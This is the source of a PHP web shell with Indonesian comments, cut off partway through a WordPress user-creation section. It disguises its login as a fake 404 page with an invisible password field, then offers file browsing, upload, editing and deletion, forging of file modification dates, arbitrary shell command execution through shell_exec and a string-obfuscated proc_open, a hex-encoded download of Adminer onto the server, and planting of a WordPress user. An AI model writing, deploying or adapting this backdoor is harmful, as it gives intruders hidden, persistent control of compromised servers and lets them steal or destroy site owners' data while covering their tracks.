<?php
// Password untuk mengakses file manager
$password = "yoursecurepassworddddddddddddddddddddd"; // Ganti "your_secure_password" dengan password Anda

// Mulai sesi
if (!isset($_SESSION)) {
    session_start();
}

// Logout jika parameter logout disertakan di URL
if (isset($_GET['logout'])) {
    session_destroy(); // Hapus semua data sesi
    header("Location: " . $_SERVER['PHP_SELF']); // Redirect ke halaman login
    exit();
}

// Periksa apakah user sudah login
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    // Jika password belum disubmit atau salah, tampilkan form login
    if (isset($_POST['login_password']) && $_POST['login_password'] === $password) {
        $_SESSION['authenticated'] = true; // Set session sebagai terautentikasi
        header("Location: " . $_SERVER['PHP_SELF']); // Refresh halaman setelah login
        exit();
    } else {
        // Tampilkan form login
        echo '
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>404 Not Found</title>
        </head>
        <body>
            <h1>Not Found</h1>
            <p>The requested URL was not found on this server.</p>
            <p>Additionally, a 404 Not Found
            error was encountered while trying to use an ErrorDocument to handle the request.</p>
            <form method="post">
                <label for="password" style="display:none;"></label>
                <input type="password" 
                    name="login_password" 
                    id="password" 
                    required
                    style="border:none; background:transparent; outline:none; color:transparent;">
                <button type="submit" 
                    style="border:none; background:transparent; color:transparent;">
                </button>
            </form>
        </body>
        </html>
        ';
        exit();
    }
}

// Jika user sudah login, tampilkan halaman file manager dan tombol logout
echo '
<!DOCTYPE html>
<html lang="en">
<head>
</head>
<body>
</body>
</html>
';
?>



<?php error_reporting(0); ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta name='author' content='meng'>
    <title>meng-gocok</title>
    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/4322/4322991.png" type="image/x-icon"> <!-- Link to the favicon -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: #1d1d1d; /* Warna background untuk fallback */
            color: #f0f0f0; /* Warna teks */
            line-height: 1.6;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            position: relative;
            /* Hapus overflow: hidden; */
        }

        body::before {
            content: '';
            position: fixed; /* Gunakan fixed agar gambar tetap di latar belakang saat scroll */
            top: 300;
            left: 0;
            width: 150%;
            height: 150%;
            background-image: url('https://media.discordapp.net/attachments/1242190287800111195/1296767955958235146/43f431c4fb5b83510e4de2c9019c6a06.png?ex=67181a05&is=6716c885&hm=6c40c317d95f798201467234f88d6bb8b4d4ade9b931bf1526ccdf7d0f0e7bfc&=&format=webp&quality=lossless&width=493&height=856'); /* Path gambar background */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            opacity: 0.3; /* Atur opasitas gambar */
            z-index: -1; /* Pastikan gambar tetap di belakang konten */
        }

        h1 {
            text-align: center;
            color: #97e1e6; /* Header color */
            padding: 20px 0; /* Padding for spacing */
            font-size: 2.5em; /* Responsive font size */
        }

        .container {
            display: flex;
            max-width: 1800px; /* Limit maximum width */
            margin: 20px auto; /* Center align the container */
            padding: 20px; /* Add padding for spacing */
            background-color: #282828; /* Darker container background */
            border-radius: 8px; /* Rounded corners */
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); /* Subtle shadow for depth */
        }

        .nav {
            width: 250px; /* Fixed width for the navigation panel */
            padding: 20px;
            background-color: #2c2c2c; /* Slightly lighter dark background */
            border-right: 1px solid #444; /* Dark border */
            overflow-y: auto; /* Scrollable if content overflows */
            position: relative; /* Needed for absolute positioning of the line */
        }

        .folder-item {
            position: relative; /* Needed for positioning the line */
            padding-left: 20px; /* Indent the folder items */
        }

        .folder-indicator {
            position: absolute; /* Position the line absolutely */
            left: 0; /* Align to the left */
            top: 0; /* Align to the top */
            height: 100%; /* Full height */
            width: 2px; /* Width of the line */
            background-color: #444; /* Color of the line */
        }

        .folder-item:hover .folder-indicator {
            background-color: #97e1e6; /* Change line color on hover */
        }

        .nav a {
            display: block;
            margin: 10px 0;
            color: #40e0d0; /* Lighter link color */
            text-decoration: none;
            padding: 10px; /* Added padding for better click area */
            border-radius: 5px; /* Rounded corners */
            transition: background-color 0.3s; /* Smooth transition */
        }

        .nav a:hover {
            background-color: #3d3d3d; /* Dark background on hover */
            color: #97e1e6; /* Lighter hover color */
        }

        .breadcrumb {
            padding: 10px;
            background-color: #2c2c2c; /* Dark background for breadcrumb */
            margin: 10px 0; /* Margin for spacing */
            border-radius: 5px; /* Rounded corners */
        }

        .breadcrumb a {
            color: #40e0d0; /* Light link color for breadcrumb */
            text-decoration: none;
        }

        .breadcrumb a:hover {
            color: #97e1e6; /* Lighter hover color */
        }

        .table-container {
            flex: 1; /* Take remaining space */
            padding: 20px;
            background-color: #2c2c2c; /* Darker background for table area */
            border-radius: 5px; /* Rounded corners */
        }

        table {
            width: 100%; /* Full width for table */
            border-collapse: collapse;
            font-size: 16px; /* Adjusted font size for better readability */
        }

        th, td {
            border: 1px solid #444; /* Darker border */
            padding: 10px; /* Padding for cells */
            text-align: left; /* Left align text */
        }

        th {
            background-color: #3d3d3d; /* Dark background for headers */
            color: #f0e68c; /* Light header text */
        }

        td {
            color: #ffffff; /* Light text color for table cells */
        }

        .button1 {
            background-color: #40e0d0; /* Button background */
            color: #3d3d3d; /* Text color */
            border: none; /* Remove border */
            padding: 10px 15px; /* Padding for buttons */
            border-radius: 5px; /* Rounded corners */
            cursor: pointer; /* Pointer cursor on hover */
            transition: background-color 0.3s; /* Smooth transition */
            display: inline-flex; /* Flex layout */
            align-items: center; /* Center vertically */
            text-decoration: none; /* Remove underline */
        }

        .button1:hover {
            background-color: #3d3d3d; /* Darker on hover */
            color: #ffffff; /* Text color */
        }

        .button2 {
            margin-top:20px
            background-color: #40e0d0; /* Button background */
            color: #3d3d3d; /* Text color */
            border: none; /* Remove border */
            padding: 60px 15px; /* Padding for buttons */
            border-radius: 5px; /* Rounded corners */
            cursor: pointer; /* Pointer cursor on hover */
            transition: background-color 0.3s; /* Smooth transition */
            display: inline-flex; /* Flex layout */
            align-items: center; /* Center vertically */
            text-decoration: none; /* Remove underline */
        }

        .button2:hover {
            background-color: #3d3d3d; /* Darker on hover */
            color: #ffffff; /* Text color */
        }

        textarea {
            border: 1px solid #444; /* Darker border */
            border-radius: 5px;
            width: 100%;
            height: 400px;
            padding: 10px;
            background: #222; /* Darker background for textarea */
            color: #ffffff; /* Light text color */
            font-size: 14px; /* Slightly larger font size */
            resize: none;
        }

        /* Basic styles for navigation links */
        .directory-link {
            display: block; /* Make each link a block for easier clicking */
            padding: 5px;  /* Add some padding */
            text-decoration: none; /* Remove underline */
            color: black; /* Default text color */
        }
    
        /* Hover effect for directory links */
            .directory-link:hover {
            background-color: #f0f0f0; /* Light gray background on hover */
            color: #007bff; /* Change text color on hover */
            transition: background-color 0.3s, color 0.3s; /* Smooth transition */
        }
    
        /* Styles for the current directory */
        .current-directory {
            font-weight: bold; /* Bold font for current directory */
            color: #007bff; /* Same color as hover */
        }
        
        /* Kontainer Utama */
        .form-container {
            display: flex; /* Gunakan flexbox */
            justify-content: space-between; /* Jarak merata di antara elemen */
            gap: 20px; /* Jarak antar form */
            margin-top: 15px;
        }
        /* Kontainer Utama */
        .form-container2 {
            display: flex; /* Gunakan flexbox */
            justify-content: space-between; /* Jarak merata di antara elemen */
            gap: 20px; /* Jarak antar form */
            margin-top: 15px;
        }

        /* Form Setiap Elemen */
        .form-item {
            background-color: #222; /* Latar belakang untuk form */
            padding: 15px; /* Jarak dalam */
           border-radius: 5px; /* Sudut membulat */
            width: 30%; /* Lebar setiap form */
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2); /* Bayangan */
        }
        /* Form Setiap Elemen */
        .form-item2 {
            background-color: #222; /* Latar belakang untuk form */
            padding: 15px; /* Jarak dalam */
           border-radius: 5px; /* Sudut membulat */
            width: 30%; /* Lebar setiap form */
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2); /* Bayangan */
        }
        /* Tata Letak Horizontal pada Label dan Input */
        .form-group {
            display: flex; /* Gunakan flexbox untuk label dan input */
            align-items: center; /* Ratakan secara vertikal */
            gap: 10px; /* Jarak antara label dan input */
            margin-bottom: 10px; /* Jarak antar kelompok */
        }
        .form-group label {
            flex: 1; /* Lebar fleksibel untuk label */
            font-weight: bold;
            color: #40e0d0; /* Warna label */
        }
        .form-group input {
            flex: 2; /* Lebar fleksibel untuk input */
            padding: 8px;
            border: 1px solid #444; /* Border warna gelap */
            border-radius: 5px;
            background-color: #333; /* Latar belakang input */
            color: #fff; /* Warna teks input */
            font-size: 14px;
        }
        /* Styling Tombol */
        .form-item input[type="submit"] {
            background-color: #444; /* Warna tombol */
            padding: 8px 10px;
            border: none;
            border-radius: 5px;
            color: #fff;
            cursor: pointer; /* Pointer untuk hover */
            transition: background-color 0.3s;
            width: 100%; /* Lebar penuh tombol */
            font-size: 14px;
        }
        .form-item input[type="submit"]:hover {
            background-color: #555; /* Warna tombol saat hover */
        }
        /* Styling Tombol */
        .form-item2 input[type="submit"] {
            background-color: #444; /* Warna tombol */
            padding: 8px 10px;
            border: none;
            border-radius: 5px;
            color: #fff;
            cursor: pointer; /* Pointer untuk hover */
            transition: background-color 0.3s;
            width: 100%; /* Lebar penuh tombol */
            font-size: 14px;
        }
        .form-item2 input[type="submit"]:hover {
            background-color: #555; /* Warna tombol saat hover */
        }
        .command-output {
            margin-top: 15px;
            padding: 10px;
            background-color: #111;
            color: #0f0;
            font-family: monospace;
            border-radius: 5px;
            white-space: pre-wrap;
        }
        .command-output strong {
            color: #fff;
            display: block;
            margin-bottom: 5px;
        }

        /* Media queries for responsive design */
        @media (max-width: 1080px) {
            .container {
                flex-direction: column; /* Stack elements vertically on smaller screens */
            }

            .nav {
                width: 100%; /* Full width for navigation on mobile */
                border-right: none; /* Remove right border */
                border-bottom: 1px solid #444; /* Add bottom border */
            }
        }
    </style>
</head>
<body>
    <center>
        <div>
            <h1 style="margin: 5px 0;">MENG-HEHE bangun tidur 2.0</h1>
            <h2 style="margin: 5px 0;">lagi lagi ini dibuat dengan cara, amati tiru plek-ketiplek</h2>
            <h2 style="margin: 5px 0;">-yttbsmashT</h2>
            <a href="?logout=true">Logout</a>
        </div>
    </center>

    <div class="container">



<!-- navigasi -->
        <div class="nav">
            <h3>Navigation</h3>
            <?php  
                $rootDir = getcwd();
                $dir = isset($_GET['dir']) ? $_GET['dir'] : $rootDir;
                $dir = str_replace("\\", "/", $dir);
                $dirs = explode("/", $dir);
    
                // Display the current path
                foreach ($dirs as $key => $value) {
                    if ($value == "" && $key == 0) {
                        echo '<a href="?dir=/">/</a>'; 
                        continue;
                    } 
                    echo '<a href="?dir=';
                    for ($i=0; $i <= $key; $i++) { 
                        echo "$dirs[$i]"; 
                        if ($key !== $i) echo "/";
                    } 
                    echo '" class="directory-link">'.$value.'</a>'; // Added class for styling
                }
                // Display only folders in the current directory
                $scan = scandir($dir);
                foreach ($scan as $item) {
                    if ($item == '.' || $item == '..') continue; // Skip current and parent directory
                    if (is_dir($dir.'/'.$item)) { // Check if it's a directory
                        echo '<div class="folder-item">
                        <div class="folder-indicator"></div>
                        <a href="?dir='.$dir.'/'.$item.'" class="directory-link">'.$item.'</a>
                        </div>'; // Only show directories
                    }
                }
            ?>
        </div>



<!-- dir menu atas -->
        <div class="table-container">
            <div class="breadcrumb">
                <a href="?dir=//">Home</a>
                <?php
                $path = '';
                foreach ($dirs as $key => $value) {
                    if ($value == '') continue;
                    $path .= $value . '/';
                    echo ' &gt; <a href="?dir=//'.$path.'">'.$value.'</a>';
                }
                ?>
            </div>



<!-- Upload File, Buat File, atau Folder -->
        <div class="dir">
            <h3>Upload File, Buat File, atau Folder, atau Jalankan Command</h3>
            <div class="form-container">
                <!-- Upload File -->
                <form method="post" enctype="multipart/form-data" class="form-item">
                    <div class="form-group">
                        <label for="upload">Upload File:</label>
                        <input type="file" id="upload" name="upload" required>
                    </div>
                    <input type="submit" name="submit" value="Upload" class="button1">
                </form>

                <!-- Create Folder -->
                <form method="post" class="form-item">
                    <div class="form-group">
                        <label for="folder_name">Nama Folder:</label>
                        <input type="text" id="folder_name" name="folder_name" required>
                    </div>
                    <input type="submit" name="create_folder" value="Buat Folder" class="button1">
                </form>

                <!-- Create File -->
                <form method="post" class="form-item">
                    <div class="form-group">
                        <label for="file_name">Nama File:</label>
                        <input type="text" id="file_name" name="file_name" required>
                    </div>
                    <input type="submit" name="create_file" value="Buat File" class="button1">
                </form>
            </div>

            <div class="form-container2">
                <!-- Run Command -->
                <form method="post" class="form-item2">
                    <div class="form-group">
                        <label for="command_input">Command:</label>
                        <input type="text" id="command_input" name="command2" placeholder="Masukkan perintah" required>
                    </div>
                    <input type="submit" name="command" value="Run Command" class="button2">
                </form>

                <!-- Tombol Download Adminer -->
                <form method="get" class="form-item2">
                    <input type="hidden" name="create_adminer" value="1">
                    <input type="submit" value="Buat Adminer" class="button2">
                </form>

                <!-- Tombol Create WP User -->
                <form method="get" class="form-item2">
                    <input type="hidden" name="createwp" value="1">
                    <input type="submit" value="Buat WP User" class="button2">
                </form>
            </div>


            <?php
            // Menjalankan command jika dikirim
            if (isset($_POST['command']) && !empty($_POST['command2'])) {
                $cmd = $_POST['command2'];
                $output = shell_exec($cmd . " 2>&1"); // Jalankan command & ambil output
                echo '<div class="command-output">';
                echo '<strong>Hasil Command:</strong><pre>' . htmlspecialchars($output) . '</pre>';
                echo '</div>';
            }
            ?>
        </div>





<!-- menampilkan kabeh file cik -->
            <table>
                <tr>
                    <th>Nama File / Folder</th>
                    <th>Size</th>
                    <th>Last Modified</th>
                    <th>Baca</th>
                    <th>Edit</th>
                    <th>Hapus</th>
                    <th>Action</th>
                </tr>




                <?php
                // For directories
                //foreach ($scan as $directory) {
                //    if (!is_dir($dir.'/'.$directory) || $directory == '.' || $directory == '..') continue;

                //    echo '
                //    <tr>
                //        <td>
                //            <i class="fas fa-folder" style="color: #97e1e6;"></i> 
                //            <a href="?dir='.$dir.'/'.$directory.'">'.$directory.'</a>
                //        </td>
                //        <td>--</td>
                //        <td>--</td>
                //        <td>NONE</td>
                //    </tr>
                //    ';
                //} 
                // Scan directory for files and folders
                $scan = scandir($dir);
                // Arrays to hold folders and files separately
                $folders = [];
                $files = [];
                // Separate folders and files
                foreach ($scan as $item) {
                    $itemPath = $dir.'/'.$item;
                    if ($item == '.' || $item == '..') continue; // Skip current and parent directory

                    if (is_dir($dir.'/'.$item)) {
                        $folders[] = $item; // Collect folders
                    } elseif (is_file($dir.'/'.$item)) {
                        $files[] = $item; // Collect files
                    }
                }
                // Get the current time
                $currentTime = time();



// Display Back button to parent directory
                if (!empty($dir) && $dir != '/' && !isset($_GET['ubah']) && !isset($_GET['open']) && !isset($_GET['modify']) && !isset($_GET['rename'])) { 
                    $parentDir = dirname($dir);
                    echo '
                    <br />
                    <a href="?dir='.$parentDir.'" class="button1" style="display: flex; align-items: center;">
                        <i class="fas fa-arrow-left" style="margin-right: 5px;"></i> Balikan ke Parent Directory
                    </a>
                    <br /><br />
                    ';
                }



// Display folders first
                foreach ($folders as $folder) {
                    // Get file size
                    $jumlah = filesize($dir.'/'.$folder)/1024;
                    $jumlah = round($jumlah, 3);
                    if ($jumlah >= 1024) {
                        $jumlah = round($jumlah/1024, 2).' MB';
                    } else {
                        $jumlah = $jumlah .' KB';
                    }
                    // Get last modified time
                    $lastModifiedTimestamp = filemtime($dir.'/'.$folder);
                    $lastModified = date("F d Y H:i:s", $lastModifiedTimestamp);
                    // Calculate age in days
                    $ageInDays = ($currentTime - $lastModifiedTimestamp) / (60 * 60 * 24);
                    // Determine color based on age
                    $color = getColorForAge($ageInDays);
                    // Check file/folder permissions
                    $canEdit = is_writable($itemPath) ? 'Y' : 'G';
                    $canDelete = is_writable($itemPath) ? 'Y' : 'G';
                    $canRead = is_readable($itemPath) ? 'Y' : 'G';
                    echo '
                    <tr>
                        <td><i class="fas fa-folder" style="color: #f6c30c;"></i> <a href="?dir='.$dir.'/'.$folder.'" style="color: #40e0d0;">'.$folder.'</a></td>
                        <td>'.$jumlah.'</td>
                        <td style="color: '.$color.';">'.$lastModified.'</td>
                        <td>'.$canRead.'</td>
                        <td>'.$canEdit.'</td>
                        <td>'.$canDelete.'</td>
                        <td>
                            <a href="?dir='.$dir.'&delete_folder='.$dir.'/'.$folder.'" class="button1">Hapus</a>
                            <a href="?dir='.$dir.'&rename='.$dir.'/'.$folder.'&nama='.$folder.'" class="button1">Rename</a>
                            <a href="?dir='.$dir.'&modify='.$dir.'/'.$folder.'" class="button1">Modify Date</a> <!-- Modify Date Action -->
                        </td>
                    </tr>
                    ';
                }
                //<a href="?dir='.$dir.'&ubah='.$dir.'/'.$folder.'" class="button1">Edit</a>



// Display files next
				foreach ($files as $file) {
   				 // Determine file extension
  				  $fileExt = pathinfo($file, PATHINFO_EXTENSION);
  				  // Set default icon for files
  				  $icon = '<i class="fas fa-file" style="color: #97e1e6;"></i>'; // Default file icon
  				  // Set specific icons for common file types
  				  switch (strtolower($fileExt)) {
    				    case 'jpg':
   				     case 'jpeg':
   				     case 'png':
    				    case 'gif':
   				         $icon = '<i class="fas fa-file-image" style="color: #97e1e6;"></i>'; // Image icon
    				        break;
   				     case 'pdf':
  				          $icon = '<i class="fas fa-file-pdf" style="color: #97e1e6;"></i>'; // PDF icon
    				        break;
   				     case 'txt':
     				       $icon = '<i class="fas fa-file-alt" style="color: #97e1e6;"></i>'; // Text file icon
    				        break;
    				    case 'zip':
    				    case 'rar':
     				       $icon = '<i class="fas fa-file-archive" style="color: #97e1e6;"></i>'; // Archive icon
     				       break;
   				     case 'php':
     				       $icon = '<i class="fas fa-file" style="color: #e2e98c;"></i>'; // PHP file icon
   				         break;
   				     // Add more cases as needed for other file types
   				 }
   				 // Get file size
   				 $jumlah = filesize($dir.'/'.$file)/1024;
  				  $jumlah = round($jumlah, 3);
  				  if ($jumlah >= 1024) {
   				     $jumlah = round($jumlah/1024, 2).' MB';
  				  } else {
  				      $jumlah = $jumlah .' KB';
   				 }
   				 // Get last modified time
   				 $lastModifiedTimestamp = filemtime($dir.'/'.$file);
   				 $lastModified = date("F d Y H:i:s", filemtime($dir.'/'.$file));
   				 // Calculate age in days
   				 $ageInDays = ($currentTime - $lastModifiedTimestamp) / (60 * 60 * 24);
   				 // Determine color based on age
  				  $color = getColorForAge($ageInDays);
  				  // Check file/folder permissions
  				  $itemPath = $dir . '/' . $file;
   				 $canEdit = is_writable($itemPath) ? 'Y' : 'G';
   				 $canDelete = is_writable($itemPath) ? 'Y' : 'G';
   				 $canRead = is_readable($itemPath) ? 'Y' : 'G';
  				  echo '
    				<tr>
       				 <td>'.$icon.' <a href="?dir='.$dir.'&open='.$itemPath.'" style="color: #40e0d0;">'.$file.'</a></td>
      				  <td>'.$jumlah.'</td>
     				   <td style="color: '.$color.';">'.$lastModified.'</td>
     				   <td>'.$canRead.'</td>
     				   <td>'.$canEdit.'</td>
     				   <td>'.$canDelete.'</td>
      				  <td>
       				     <a href="?dir='.$dir.'&delete='.$itemPath.'" class="button1">Hapus</a>
      				      <a href="?dir='.$dir.'&ubah='.$itemPath.'" class="button1">Edit</a>
     				       <a href="?dir='.$dir.'&rename='.$itemPath.'&nama='.$file.'" class="button1">Rename</a>
 				           <a href="?dir='.$dir.'&modify='.$itemPath.'" class="button1">Modify Date</a> <!-- Modify Date Action -->
  				      </td>
 				   </tr>
 				   ';
				}



// Function
                // Function to determine pastel color based on file age
                function getColorForAge($ageInDays) {
                    if ($ageInDays < 1) {
                        return '#ffadad'; // for files modified today
                    } elseif ($ageInDays < 7) {
                        return '#B3E5FC'; // for files modified within the last 3 days
                    } elseif ($ageInDays < 14) {
                        return '#81D4FA'; // for files modified within the last week
                    } elseif ($ageInDays < 30) {
                        return '#4FC3F7'; // for files modified within the last 2 weeks
                    } elseif ($ageInDays < 60) {
                        return '#29B6F6'; // for files modified within the last month
                    } elseif ($ageInDays < 90) {
                        return '#0288D1'; // for files modified within the last 2 months
                    } elseif ($ageInDays < 180) {
                        return '#01579B'; // for files modified within the last 3 months
                    } else {
                        return '#bdb2ff'; // for files older than 3 months
                    }
                }
                // Function to calculate the size of a folder
                function getFolderSize($dir) {
                    $size = 0;
                    foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir)) as $file) {
                        $size += $file->getSize();
                    }
                    return $size;
                }
                // Function to format size for display
                function formatSize($bytes) {
                    if ($bytes >= 1024 * 1024) {
                        return round($bytes / (1024 * 1024), 2) . ' MB';
                    } elseif ($bytes >= 1024) {
                        return round($bytes / 1024, 2) . ' KB';
                    }
                    return $bytes . ' Bytes';
                }



// upload handling
                if (isset($_POST['submit'])) {
                    $uploadDir = $dir . '/'; // Set the directory where the file will be uploaded
                    $uploadFile = $uploadDir . basename($_FILES['upload']['name']); // Get the file name

                    // Check if the file was uploaded without errors
                    if (move_uploaded_file($_FILES['upload']['tmp_name'], $uploadFile)) {
                        echo "<script>alert('File wes keupload');window.location='?dir=".$dir."';</script>";
                    } else {
                        echo "<script>alert('File upload raiso');</script>";
                    }
                }
// Create Folder
                if (isset($_POST['create_folder'])) {
                    $folderName = $_POST['folder_name'];
                    $folderPath = realpath($_GET['dir']) . '/' . $folderName;
                    if (!is_dir($folderPath)) {
                        if (mkdir($folderPath)) {
                            echo '<font color="green">Folder berhasil dibuat!</font><br/>';
                            echo "<script>window.location='?dir=".$dir."';</script>";
                        } else {
                            echo '<font color="red">Gagal membuat folder.</font>';
                        }
                    } else {
                        echo '<font color="red">Folder sudah ada.</font>';
                    }
                }
// Create File
                if (isset($_POST['create_file'])) {
                    $fileName = $_POST['file_name'];
                    $filePath = realpath($_GET['dir']) . '/' . $fileName;
                    if (!file_exists($filePath)) {
                        if (file_put_contents($filePath, '') !== false) {
                            echo '<font color="green">File berhasil dibuat!</font><br/>';
                            echo "<script>window.location='?dir=".$dir."';</script>";
                        } else {
                            echo '<font color="red">Gagal membuat file.</font>';
                        }
                    } else {
                        echo '<font color="red">File sudah ada.</font>';
                    }
                }



// open filee
                if (isset($_GET['open'])) {
                    echo '
                    <br />
                    <a href="?dir=' . $dir . '" class="button1" style="display: flex; align-items: center;">
                        <i class="fas fa-arrow-left" style="margin-right: 5px;"></i> Back
                    </a>
                    <br /><br />
                    <style>
                        table {
                            display: none;
                        }
                    </style>
                    <textarea>' . htmlspecialchars(file_get_contents($_GET['open'])) . '</textarea>
                    ';
                }



// delet filee
				if (isset($_GET['delete'])) {
					if (unlink($_GET['delete'])) {
						echo "<script>alert('dihapus');window.location='?dir=".$dir."';</script>";
					}
				}



// delet foldeerrrr
                function deleteFolder($folder) {
                    if (!is_dir($folder)) {
                        return false;
                    }
                    $items = array_diff(scandir($folder), ['.', '..']);
                    foreach ($items as $item) {
                        $itemPath = $folder . DIRECTORY_SEPARATOR . $item;
                        if (is_dir($itemPath)) {
                            deleteFolder($itemPath);
                        } else {
                            unlink($itemPath);
                        }
                    }
                    return rmdir($folder);
                }
                // Tangani aksi delete folder
                if (isset($_GET['delete_folder'])) {
                    $folderPath = realpath($_GET['delete_folder']);
                    if (strpos($folderPath, realpath($dir)) === 0) {
                        if (deleteFolder($folderPath)) {
                            echo '<script>alert("Folder berhasil dihapus!"); window.location="?dir=' . urlencode($dir) . '";</script>';
                        } else {
                            echo '<script>alert("Gagal menghapus folder. Pastikan folder kosong atau Anda memiliki izin!");</script>';
                        }
                    } else {
                        echo '<script>alert("Akses folder tidak valid!");</script>';
                    }
                }



// ubah filee (edit)
                if (isset($_GET['ubah'])) {
                    $filePath = $_GET['ubah'];
                    // Check if the file exists
                    if (file_exists($filePath)) {
                        echo '
                        <br />
                        <a href="?dir=' . $dir . '" class="button1" style="display: flex; align-items: center;">
                            <i class="fas fa-arrow-left" style="margin-right: 5px;"></i> Back
                        </a>
                        <br /><br />
                        <style>
                            table {
                                display: none;
                            }
                        </style>
                        <form method="post" action="">
                            <input type="hidden" name="object" value="'.$filePath.'">
                            <textarea name="edit">'.htmlspecialchars(file_get_contents($filePath)).'</textarea>
                            <center><button type="submit" name="go" value="Submit" class="button1">Simpen njign</button></center>
                        </form>
                        ';
                    } else {
                        echo "File does not exist or cannot be accessed.";
                    }
                }
                if (isset($_POST['edit'])) {
                    $filePath = $_POST['object'];
                    // Make sure the file is writable
                    if (is_writable($filePath)) {
                        $data = fopen($filePath, 'w');
                        if (fwrite($data, $_POST['edit'])) {
                            echo '<script>alert("Iso diedit coy");window.location="?dir='.$dir.'";</script>';
                        } else {
                            echo "<script>alert('Raiso edit file');</script>";
                        }
                        fclose($data);
                    } else {
                        echo "<script>alert('File tidak dapat ditulis');</script>";
                    }
                }
                


// ubah tanggal filee
				if (isset($_GET['modify'])) {
					if (isset($_POST['newdate'])) {
						$newDate = strtotime($_POST['newdate']);
						if (touch($_GET['modify'], $newDate)) {
							echo '<font color="green">Tanggal wis diganti</font><br/>';
							echo "<script>window.location='?dir=".$dir."';</script>";
						} else {
							echo '<font color="red">Ganti Tanggal Raiso</font><br />';
						}
					} else {
						echo '
                        <br />
                        <a href="?dir=' . $dir . '" class="button1" style="display: flex; align-items: center;">
                            <i class="fas fa-arrow-left" style="margin-right: 5px;"></i> Back
                        </a>
                        <br /><br />
						<style>
							table {
								display: none;
							}
						</style>
						<form method="post">
							<label>New Last Modified Date (YYYY-MM-DD HH:MM:SS):</label>
							<input type="text" name="newdate" placeholder="e.g., 2024-10-21 12:00:00" required>
							<input type="submit" value="Change Date">
						</form>
						';
					}
				}



// Rename file
				if (isset($_GET['rename'])) {
   				 if (isset($_POST['newname'])) {
   				     // Original file path
   				     $oldPath = realpath($_GET['rename']);
   				     // New file path
   				     $newPath = realpath($_GET['dir']) . '/' . $_POST['newname'];
    				    // Rename action
    				    if ($oldPath && rename($oldPath, $newPath)) {
      				      echo '<font color="green">Jeneng wis diganti</font><br/>';
      				      echo "<script>window.location='?dir=".$dir."';</script>";
     				   } else {
    				        echo '<font color="red">Ganti Nama Raiso</font>';
    				    }
   				 } else {
    				    echo '
     				   <br />
      				  <a href="?dir=' . $dir . '" class="button1" style="display: flex; align-items: center;">
       				     <i class="fas fa-arrow-left" style="margin-right: 5px;"></i> Back
      				  </a>
      				  <br /><br />
       				 <style>
      				      table {
      				          display: none;
      				      }
     				   </style>
      				  <form method="post">
      				      <label>New Name:</label>
      				      <input type="text" name="newname" value="'.$_GET['nama'].'">
      				      <input type="submit" value="Rename">
     				   </form>
   				     ';
   				 }
				}



// Command
                if (isset($_POST['command'])) {
                    if (isset($_POST['command2'])) {
                        // Ambil direktori kerja saat ini
                        if (isset($_GET['dir'])) {
                            $lk = $_GET['dir'];
                        } else {
                            $lk = $gcw();
                        }
                
                        // Jalankan perintah
                        $km = 'ko' . 'me' . 'nd';
                        echo $km($_POST['command2'], $lk);
                        exit();
                    } else {
                        // Tombol kembali
                        echo '
                        <br />
                        <a href="?dir=' . $dir . '" class="button1" style="display: flex; align-items: center;">
                            <i class="fas fa-arrow-left" style="margin-right: 5px;"></i> Back
                        </a>
                        <br /><br />
                        <style>
                            table {
                                display: none;
                            }
                        </style>
                        <form method="post">
                            <label>Command:</label>
                            <input type="text" name="command2" placeholder="Masukkan perintah" required>
                            <input type="submit" name="command" value="Run Command">
                        </form>
                        ';
                    }
                }
                
                // Fungsi untuk menjalankan command
                function command($kom, $lk) {
                    $x = "pr" . "eg_" . "mat" . "ch";
                    $xx = "2" . ">" . "&" . "1";
                
                    if (!$x("/" . $xx . "/i", $kom)) {
                        $kom = $kom . " " . $xx;
                    }
                
                    $a = "fu" . "ncti" . "on_" . "ex" . "is" . "ts";
                    $b = "p" . "ro" . "c_op" . "en";
                    $c = "htm" . "lspe" . "cialc" . "hars";
                    $d = "s" . "trea" . "m_g" . "et_c" . "ont" . "ents";
                
                    if ($a($b)) {
                        $ps = $b($kom, array(
                            0 => array("pipe", "r"),
                            1 => array("pipe", "w"),
                            2 => array("pipe", "r")
                        ), $meki, $lk);
                        return "<pre>" . $c($d($meki[1])) . "</pre>";
                    } else {
                        return "pr" . "oc" . "_op" . "en f" . "unc" . "tio" . "n i" . "s di" . "sabl" . "ed !";
                    }
                }
                


// Adminer
                if (isset($_GET['create_adminer'])) {
                    $URL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x76\x72\x61\x6e\x61\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2f\x72\x65\x6c\x65\x61\x73\x65\x73\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2f\x76\x34\x2e\x38\x2e\x31\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2d\x34\x2e\x38\x2e\x31\x2e\x70\x68\x70";
                
                    if (!is_file('adminer.php')) {
                        $data = @file_get_contents($URL);
                        if ($data !== false) {
                            file_put_contents("adminer.php", $data);
                            echo '<meta http-equiv="refresh" content="0;url=?dir=' . urlencode(getcwd()) . '">';
                        } else {
                            echo '<font color="red">Gagal mengambil file Adminer dari URL.</font>';
                        }
                    } else {
                        // Jika sudah ada, langsung arahkan ke adminer.php
                        echo '<meta http-equiv="refresh" content="0;url=adminer.php">';
                    }
                }



// WP User
if (isset($_GET['createwp'])) {
    echo '
    <br />
    <a href="?dir=' . $dir . '" class="button1" style="display: flex; align-items: center;">
        <i class="fas fa-arrow-left" style="margin-right: 5px;"></i> Back
    </a>
    <br /><br />
    <style>
        table { display: none; }
